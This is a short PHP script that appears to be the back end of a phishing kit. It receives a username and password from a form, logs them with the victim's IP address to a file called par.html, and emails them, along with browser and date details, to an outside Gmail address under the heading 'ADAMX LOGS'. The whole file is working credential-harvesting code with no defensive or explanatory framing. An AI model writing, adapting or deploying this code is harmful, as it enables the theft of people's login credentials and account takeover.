<?php 
$ip = getenv("REMOTE_ADDR"); 
$datamasii=date("D M d, Y g:i a"); 
$em = $_POST['x1'] ;
$ps = $_POST['x2'] ;

$f = fopen("par.html", "a"); 
fwrite ($f, 'Username: [<b><font color="#570000">'.$em.'</font></b>] Password: [<b><font color="#57003A">'.$ps.'</font></b>] IP: [<b><font color="#005700">'.$ip.'</font></b>] By: [<b><font color="#005700"><a href="#" rel="M R H Hacking"></a></font></b>]<br>');
fclose($f);

$mesaj = "------------ADAMX--------------

-----------ADAMX Logs-------------
Username : $em
Password : $ps
IP:$ip
----------------------------------------------------
Browser         :  ".$_SERVER['HTTP_USER_AGENT']."
DATE : $datamasii"; 

$subject = "ADAMX  LOGS";
mail('jackhorseford@gmail.com', $subject, $mesaj);

?>

